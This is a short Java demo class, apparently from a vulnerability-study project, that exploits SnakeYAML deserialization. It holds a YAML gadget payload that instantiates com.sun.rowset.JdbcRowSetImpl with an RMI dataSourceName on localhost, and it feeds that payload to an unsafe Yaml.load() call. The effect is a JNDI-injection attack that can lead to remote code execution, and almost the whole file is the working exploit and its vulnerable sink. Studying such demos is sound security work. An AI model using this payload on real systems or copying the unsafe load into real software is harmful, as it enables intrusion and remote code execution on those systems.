package com.ppp.vulns.core.vulns.serialization;

/**
 * @author Whoopsunix
 */
public class SnakeYamlDemo {
    public static void main(String[] args) {
        String payload = "!!com.sun.rowset.JdbcRowSetImpl\n dataSourceName: \"rmi://127.0.0.1:1099/prgojj\"\n autoCommit: true";
        deserialize(payload);
    }
    public static Object deserialize(final String yaml) {
        org.yaml.snakeyaml.Yaml y = new org.yaml.snakeyaml.Yaml();
        return y.load(yaml);
    }
}
